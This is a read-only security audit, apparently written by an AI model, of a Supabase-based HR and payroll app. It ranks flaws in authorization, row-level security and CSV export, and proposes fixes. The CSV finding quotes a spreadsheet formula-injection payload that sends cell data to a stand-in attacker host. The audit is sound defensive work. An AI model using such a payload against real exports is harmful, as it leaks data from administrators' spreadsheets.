# Sol Audit 1 — Authorization, RLS↔App Agreement, and Data Exposure

> Authored entirely by GPT-5.6 "Sol" (Codex), one-shot independent pass, on 2026-07-13.
> Provenance: [Sol · date] = GPT-5.6 Sol · later passes append findings tagged [Model · date].

## 1. Executive summary

The intended model is sensible—deny by default, DB-sourced roles, direct-report checks, narrow compensation projections—but it is not yet sound enough for real HR/payroll data. Most page, action, and route boundaries authenticate and authorize correctly. The largest gap is architectural: the browser-facing `authenticated` role retains direct mutation grants that are broader than the carefully validated and audited Server Actions. Anyone with a normal Supabase session can call PostgREST/Storage directly and bypass those actions.

Top five risks:

1. **BLOCKER:** the shipped deployment default permits public signup; a self-registered employee session can reach authenticated-only HR projections. Full lifecycle trace is in Audit 2 §2.1.
2. **BLOCKER:** a manager can directly update a pending direct report leave row and change arbitrary columns while approving it; RLS checks the row, not the permitted column transition.
3. **NEEDS-FIX:** direct document and Storage grants let employees bypass upload category rules, metadata consistency, and audit logging.
4. **NEEDS-FIX:** many service-role paths correctly pre-authorize but then perform multi-step, non-transactional writes; a partial employee update can change a security role while returning failure.
5. **NEEDS-FIX:** CSV export is RFC-escaped but not spreadsheet-formula neutralized; a self-editable display name can become an admin-side formula payload.

## 2. Ranked findings

### BLOCKER — Manager RLS permits arbitrary leave-row rewrites during approval

**Evidence:** `supabase/migrations/0006_leave.sql:99`, `supabase/migrations/0006_leave.sql:150-163`; the application sends a narrow payload at `src/server/actions/leave.ts:600-610`.

**Defect:** `authenticated` has table-wide `UPDATE`. The manager policy's old-row predicate requires a pending direct report and its new-row predicate only requires a direct report plus `status in ('approved','rejected')`. It does not freeze `employee_id`, `leave_type_id`, dates, notes, half-day state, or approver identity.

**Concrete trace:** Morgan authenticates normally, calls PostgREST directly for Alice's pending request, and submits one `UPDATE` that changes `leave_type_id`, dates, `is_half_day`, `approver_id`, and status to `approved`. Alice is a direct report before and after, so the RLS predicates pass. The balance trigger then deducts against the attacker-supplied values; no Server Action validation or audit runs.

**Fix:** revoke direct `UPDATE` on `leave_requests` from `authenticated`; expose narrowly parameterized `SECURITY DEFINER` transition functions that re-check actor, scope, immutable columns, and status atomically, or enforce immutable fields in a trigger and use column grants/RPCs. Keep the Server Action as an adapter, not the sole integrity boundary.

**Confidence:** high.

### NEEDS-FIX — Employee document/Storage grants bypass the application upload contract

**Evidence:** direct metadata insert is granted/policed at `supabase/migrations/0007_documents.sql:24-59`; direct object insert is allowed at `supabase/migrations/0015_storage_documents.sql:44-52`; the bucket is only a union MIME/size guard at `supabase/migrations/0029_document_upload_policy.sql:5-21`; the application has stricter category, scope, path, and audit handling at `src/server/actions/documents.ts:103-208`, `src/server/actions/documents.ts:226-265`.

**Defect:** an employee session may upload any bucket-allowed MIME to any category-looking path under its UUID, then insert its own non-payslip metadata directly. This bypasses per-category MIME/extension rules, application-generated paths, file/metadata atomicity cleanup, and `document.uploaded` audit.

**Concrete trace:** Alice uploads a DOCX object to `alice-uuid/policy/chosen.docx` through Storage, although application policy permits only PDFs for `policy`; she then inserts a `documents` row categorized as `policy`. Both RLS checks pass. The admin/manager UI later treats the row as an application-validated policy document, but there is no upload audit and its bytes were never checked by the action.

**Fix:** remove browser insert grants/policies and route all writes through one transactional server boundary; alternatively, make a tightly scoped upload-intent RPC issue a server-chosen path/category contract and validate it in Storage/database triggers. Add content-signature and malware scanning as covered in Audit 2.

**Confidence:** high.

### NEEDS-FIX — Manager task insertion is a second direct-API bypass

**Evidence:** `authenticated` retains `INSERT` at `supabase/migrations/0008_onboarding.sql:51-53`, and the manager policy only checks direct-report `employee_id` at `supabase/migrations/0008_onboarding.sql:95-100`. The action restricts title length, due date, assignee, initial status, and audit at `src/server/actions/onboarding.ts:361-427`. Migration `0017` revokes direct updates but leaves inserts (`supabase/migrations/0017_onboarding_task_update_hardening.sql:1-8`).

**Concrete trace:** a manager inserts a task for a direct report with `assignee_id` set to an unrelated user, `status='completed'`, an arbitrarily long title, and fabricated timestamps. RLS accepts it because only `employee_id` scope is checked. The application neither validates nor audits the write.

**Fix:** revoke direct insert and use the already-existing Server Action/RPC path, or strengthen the DB boundary to enforce assignee, initial status, bounds, provenance, and audit atomically.

**Confidence:** high.

### NEEDS-FIX — Employee role can commit while the employee update reports failure

**Evidence:** `src/server/actions/employees.ts:419-428` updates the profile/role with the service client; `src/server/actions/employees.ts:435-455` separately updates the employee record and returns failure on error; success audit is only at `src/server/actions/employees.ts:458-469`. Role propagation is triggered by `supabase/migrations/0013_role_sync.sql:12-27`.

**Concrete trace:** an admin submits a valid employee ID and a stale or mismatched `recordId`. The profile update—including a manager/admin role change—commits and synchronizes to Auth. The second update matches no employee record and `.single()` errors. The user sees “could not be updated,” and no `employee.updated` audit exists, but the security role has changed.

**Fix:** move profile + employee-record + role-derived state into one database transaction/RPC; return the committed row and write the audit in that transaction. If Auth metadata must remain separate, use an outbox/retry state and expose reconciliation health.

**Confidence:** high.

### NEEDS-FIX — Performance goal audit can name the wrong employee

**Evidence:** the action validates and scopes the form's employee at `src/server/actions/performance.ts:396-427`; for an existing goal it separately scopes the actual owner at `src/server/actions/performance.ts:442-464` and deliberately does not transfer ownership at `src/server/actions/performance.ts:476-486`; nevertheless the audit uses the form employee at `src/server/actions/performance.ts:513-529`.

**Concrete trace:** a manager who manages Alice and Bob submits Alice's `goalId` with Bob's `employeeId`. Both independent scope checks pass. Alice's goal is updated, but the audit metadata says `employee_id=Bob`, corrupting an HR accountability trail.

**Fix:** reject when `parsed.employeeId !== current.employee_id`, or derive all ownership/audit fields from the loaded row and never from redundant caller input.

**Confidence:** high.

### NEEDS-FIX — Deadline policy does not cover employee goal progress

**Evidence:** migration intent says hard lock rejects “all writes against the cycle” at `supabase/migrations/0038_performance_submission_deadline.sql:1-12`. `updateOwnGoalProgress` loads only owner/status and updates with the service client, with no cycle/deadline check, at `src/server/actions/performance.ts:788-825`. The form also stays enabled at `src/components/performance/performance-forms.tsx:516-565`.

**Concrete trace:** after an admin enables a passed hard deadline, an employee continues changing progress and completion state. Other goal/review actions call `assertCycleNotDeadlineLocked`; this path does not, so the “frozen” cycle is not frozen.

**Fix:** decide the invariant explicitly. If the migration's “all writes” statement is correct, load `cycle_id`, call the deadline guard, and make the update predicate include the current cycle/lock state. If progress is intentionally exempt, update the migration comments, UI language, and access documentation so the exception is not accidental.

**Confidence:** high on behavior; medium on product intent.

### NEEDS-FIX — CSV cells are not safe for spreadsheet evaluation

**Evidence:** export is admin-only at `src/app/(app)/reports/export/route.ts:20-32`; `csvCell` only handles RFC delimiters at `src/app/(app)/reports/export/route.ts:80-107`. Authenticated employees can directly update their own `display_name` because of `supabase/migrations/0002_profiles_departments.sql:52-56` plus the column grant in `supabase/migrations/0014_phase5_security_hardening.sql:33-34`.

**Concrete trace:** Alice sets her display name to `=HYPERLINK("https://attacker.example/?x="&A1,"Alice")` through PostgREST. An admin exports a people/headcount-style CSV and opens it in a formula-evaluating spreadsheet. The value is emitted verbatim and interpreted as a formula rather than text.

**Fix:** prefix cells beginning with `=`, `+`, `-`, `@`, tab, or carriage return with a single quote (or use a spreadsheet-safe CSV library/policy); add regression cases for every dangerous prefix.

**Confidence:** high for emitted payload; spreadsheet execution behavior depends on the admin's client.

### NIT — Public-holiday RLS is broader than its documentation

**Evidence:** the policy returns every row to any authenticated user at `supabase/migrations/0040_public_holidays.sql:51-53`; `docs/rls-policy-map.md:155-162` says employees/managers see active rows only.

**Concrete trace:** an employee queries `public_holidays` directly and sees inactive/tentative historical rows that the UI filters out. This is not sensitive HR data, but it proves the docs↔DB cross-check checks inventory rather than predicate semantics.

**Fix:** add `is_active = true OR get_user_role()='admin'`, or document that all holiday rows are intentionally public to authenticated users.

**Confidence:** high.

## 3. Server Action and Route Handler coverage ledger

This is the end-to-end inventory used for the findings above. “Sound” means the action authenticates, checks the stated role, and derives/checks object scope before mutation; it does not override the cross-cutting non-atomic audit finding in Audit 2.

| Boundary | Auth / role / object trace | Verdict |
|---|---|---|
| `auth.logout`, `auth.authRedirectUrl` (`src/server/actions/auth.ts:9-32`) | Logout operates only on the caller's cookie session; URL helper reads no HR data and performs no mutation. Neither requires a role. | Authorization sound; logout failure handling is an Audit 2 issue. |
| `appSettings.updateAppSettings` (`src/server/actions/app-settings.ts:86-184`) | `requireRole(admin)` → Zod → singleton service-role update → audit. | Sound scope; validation audit missing. |
| `departments.createDepartment`, `updateDepartment`, `deleteDepartment` (`src/server/actions/departments.ts:40-215`) | Every entry requires admin; update/delete use caller ID under admin RLS and audit success. | Role sound; no-row and validation conventions need standardization. |
| `employees.createEmployee`, `updateEmployee`, `sendEmployeePasswordReset` (`src/server/actions/employees.ts:134-558`) | Every entry requires admin; IDs are validated/resolved; Auth/profile/record writes use service role/session. | Role sound; update is non-transactional and can partially change role. |
| `compensation.upsertCompensation` (`src/server/actions/compensation.ts:155-287`) | Admin → validated employee → service-role upsert → audit. | Sound. |
| `compensation.selfUpdateCompensation` (`src/server/actions/compensation.ts:306-445`) | Any app role → rejects injected admin-only keys → update predicate forces `employee_id=user.id` and a restricted payload. | Sound object scope. |
| `documents.uploadDocument` (`src/server/actions/documents.ts:77-269`) | Any role → employee=self; manager=self or direct report + safe category; payslip=admin; server path. | Action sound; direct DB/Storage grant and byte validation findings remain. |
| `documents.getSignedDownloadUrl` (`src/server/actions/documents.ts:359-424`) | Any role → session-RLS metadata lookup by document ID → service role signs only returned `storage_path`. | Sound IDOR boundary. |
| `documents.softDeleteDocument` (`src/server/actions/documents.ts:429-503`) | Admin → validated document row → metadata soft delete + object removal → audit. | Sound role; cross-store atomicity remains best-effort. |
| `leave.submitLeaveRequest` (`src/server/actions/leave.ts:167-527`) | Any role → request always owned by caller → validated dates/type/balance/overlap → session insert. | Sound app scope; direct table insert remains broader and unaudited. |
| `leave.approveLeaveRequest`, `rejectLeaveRequest` (`src/server/actions/leave.ts:529-815`) | Admin/manager → session RLS restricts manager to reports → explicit self deny → conditional pending update. | Scope sound; zero-row race creates false success/audit. |
| `leave.cancelLeaveRequest` (`src/server/actions/leave.ts:819-925`) | Any role → session row lookup; non-admin must own → conditional select-back update. | Sound and race-aware; refund trigger is wrong (Audit 5). |
| `leave.createLeaveType`, `toggleLeaveType`, `upsertLeaveBalance`, `rolloverLeaveBalances` (`src/server/actions/leave.ts:1095-1513`) | Every mutation requires admin; employee/type IDs are validated or resolved; service-role writes. | Role sound; toggles need affected-row checks. |
| `leave.previewWorkingDays` (`src/server/actions/leave.ts:1515-1595`) | Any authenticated role; read-only holiday projection. | No IDOR; computational bound missing (Audit 4). |
| `leave.createPublicHoliday`, `updatePublicHoliday`, `togglePublicHoliday`, `bulkUploadPublicHolidays` (`src/server/actions/leave.ts:1616-1914`) | Every mutation requires admin and uses validated data/service role. | Role sound; no-row handling/audit conventions drift. |
| `onboarding.createTemplate`, `toggleTemplate`, `addTemplateItem`, `deleteTemplateItem` (`src/server/actions/onboarding.ts:75-226`) | Admin-only template writes. | Role sound; validation/no-row gaps. |
| `onboarding.assignTemplateToEmployee`, `addIndividualTask` (`src/server/actions/onboarding.ts:236-542`) | Admin or manager; manager target checked against active direct-report IDs before write. | Action scope sound; manager direct table INSERT bypass exists. |
| `onboarding.completeTask` (`src/server/actions/onboarding.ts:544-613`) | Employee → service-load task → owner/assignee check → conditional owner/status update. | Sound IDOR/race boundary. |
| `onboarding.deleteTask` (`src/server/actions/onboarding.ts:617-644`) | Admin-only delete. | Role sound; nonexistent row is audited as deleted. |
| `performance.createReviewCycle`, `updateReviewCycle` (`src/server/actions/performance.ts:120-374`) | Admin-only validated service-role writes; lock-disable path explicitly audited. | Sound role. |
| `performance.savePerformanceGoal`, `reopenGoalDefinition` (`src/server/actions/performance.ts:376-757`) | Admin/manager → requested and actual owner each checked with `canManageEmployee` → deadline/definition locks. | Object scope sound; audit owner mismatch and partial review bootstrap remain. |
| `performance.updateOwnGoalProgress` (`src/server/actions/performance.ts:759-887`) | Employee-only → service-load actual owner → self equality → update. | IDOR sound; deadline policy omitted. |
| `performance.submitManagerReview`, `reopenManagerReview` (`src/server/actions/performance.ts:889-1186`) | Admin/manager → target scope + cycle lock/status checks → service write. | Scope sound; conditional state transitions should be atomic. |
| `performance.submitSelfReview`, `acknowledgeReview` (`src/server/actions/performance.ts:1188-1420`) | Employee-only → actual review owner equality + state checks. | Sound IDOR boundary; state predicates should move into update/RPC. |
| `POST /api/auth/password-reset-requested` (`src/app/api/auth/password-reset-requested/route.ts:14-66`) | Deliberately public; same-origin + per-IP limiter; writes sanitized domain-only audit. | No HR data access; proxy/rate-limit caveats in Audit 2. |
| `GET /reports/export` (`src/app/(app)/reports/export/route.ts:20-107`) | `requireRole(admin)`; report key/filter allowlists; same restricted report DTO used for CSV. | Role/data projection sound; formula injection finding remains. |

No other exported Server Actions or Route Handler methods were found under `src/server/actions/` or `src/app/`.

## 4. Service-role-key usage inventory

`createAdminClient()` is server-only (`src/lib/supabase/admin.ts:1-18`) and no secret-key import reaches a client component. The concern is authorization ownership, not bundle leakage.

| Call site(s) | Purpose and user-controlled input | Verdict |
|---|---|---|
| `src/server/audit.ts:5-30` | Append audit rows for all callers. | Server-only, but fail-open and non-atomic; Audit 2 blocker. |
| `src/server/email.ts:33-83` | Resolve recipient/admin/manager email addresses by IDs supplied by already-authorized workflows. | Acceptable projection; failure is best-effort. Do not export these helpers to unauthenticated routes. |
| `src/server/actions/app-settings.ts:86-169` | Admin-only singleton read/update. | Scope sound; audit is non-atomic. |
| `src/server/actions/employees.ts:134-299`, `385-469`, `493-558` and helpers `310-371`, `563-631`, `812-828` | Create Auth users, edit profiles/roles, generate recovery links, resolve form labels. | Role gates are admin-only. Update is non-transactional and role-critical (finding above). |
| `src/server/actions/documents.ts:77-269`, `359-424`, `429-503` | Upload/storage metadata, sign a URL after session-RLS row lookup, admin soft-delete/remove. | Object checks are generally sound. Upload trusts declared file type; direct DB/Storage grants bypass it. Signed URL path is derived from authorized metadata, not caller path. |
| `src/server/actions/compensation.ts:155-287`, `306-445` | Admin full compensation update and self-only restricted-field update. | Sound object checks; self path forces `employee_id=user.id` and rejects admin-only keys. |
| `src/server/actions/onboarding.ts:75-356`, `544-644` | Admin template writes, scoped assignments, employee completion, admin deletion. | Most scope checks sound; several no-op writes are treated as success and audit is non-atomic. `addIndividualTask` uses the session client. |
| `src/server/actions/performance.ts:120-1419`, helpers `1426-1467`, `1492-1519` | Every performance mutation and label/deadline resolution. | Explicit role/object checks are mostly sound. Existing-goal audit owner drift and deadline omission remain. Service-role use makes these app checks the only mutation boundary. |
| `src/server/actions/leave.ts:951-1073`, `1095-1490`, `1515-1914` | Balance/holiday helpers and admin mutations; preview reads. Core submit/approve/reject/cancel use the session client. | Admin gates are sound; preview is user-controlled and computationally unbounded (Audit 4). TS/SQL working-day mirrors can drift. |
| `src/server/dal/onboarding.ts:55-317` | Templates/tasks/progress and scoped picker hydration. | **Mixed.** Caller-supplied employee/manager IDs are trusted. Current pages pass IDs from `requireRole`, but the DAL does not enforce that contract itself. |
| `src/server/dal/compensation.ts:42-98` | Admin/full row and arbitrary employee salary summary; manager direct reports use a session RPC at `106-145`. | Acceptable only because current callers pass the authenticated user's ID or are admin pages. Prefer viewer-aware signatures. |
| `src/server/dal/performance.ts:203-324` | Hydrate names/cycle titles for rows already fetched through session RLS. | Acceptable bounded-ID hydration; still bypasses RLS unnecessarily for non-sensitive labels. |
| `src/server/dal/employees.ts:407-431`, `548-723` | Manager upload-picker labels; admin “needs attention” projection including passport/nationality presence. | First is bounded by authoritative report IDs. Second must remain admin-only; caller contract is not encoded in the function. |
| `src/server/dal/app-settings.ts:59-88` | Read settings/timezone where session access may not be available. | Low risk, but masks configuration errors as null/fallback. |

## 5. RLS↔application disagreements

| Resource / operation | DB reality | Application/documented reality | Direction / verdict |
|---|---|---|---|
| `leave_requests` manager UPDATE | Direct manager update of any columns if old/new row remains in report scope and final status is approved/rejected. | Action changes decision fields only. | **DB looser; real integrity hole.** |
| `documents` employee INSERT + `storage.objects` INSERT | Direct metadata/object writes allowed. | Upload action enforces per-category types, server path, cleanup, audit. | **DB looser; latent grant now directly callable.** |
| `onboarding_tasks` manager INSERT | Direct insert for report; assignee/status/field provenance unrestricted. | Action enforces pending/self-assignee, Zod, audit. | **DB looser.** |
| `profiles` own UPDATE | Employee/manager can directly update granted display/phone/avatar columns. | No self-profile write action; policy map calls some of this latent. | **DB looser; enables CSV payload path.** |
| `public_holidays` SELECT | All active and inactive rows to any authenticated user. | Policy map says non-admin roles see active only. | **DB looser; low sensitivity.** |
| `documents` UPDATE | Only admin RLS is effective; no employee update policy. | `docs/rls-policy-map.md:173-180` says employee own non-sensitive UPDATE. | **App/docs looser than DB; currently no action, so denial rather than exposure.** |
| `app_settings` INSERT/DELETE | No grants/policies after migration 0032. | `docs/rls-policy-map.md:287-294` says admin allowed. | **Docs looser than DB; current app only updates.** |
| Performance mutations | No authenticated mutation grants; service role only. | Server Actions own all writes. | Agreement in effect, but every action check is security-critical. |
| Compensation manager view | No base-table report SELECT after migration 0050; fixed projection RPC only. | Manager sees direct-report salary summary without bank/tax IDs. | **Good agreement.** |

## 6. What I could not verify

- **UNVERIFIED:** the gitignored production `.env` may override `DISABLE_SIGNUP=false`; repository defaults are unsafe, but live value was not read.
- **UNVERIFIED:** no live PostgREST/RLS requests were executed because this audit is read-only. Findings are derived from final grants/policies in migration order.
- **UNVERIFIED:** signed-URL TTL and cookie attributes depend partly on the deployed Supabase version/config and response behavior; static code does not expose all runtime values.
- I did not inspect any parallel reviewer's audit files, per the independence constraint.
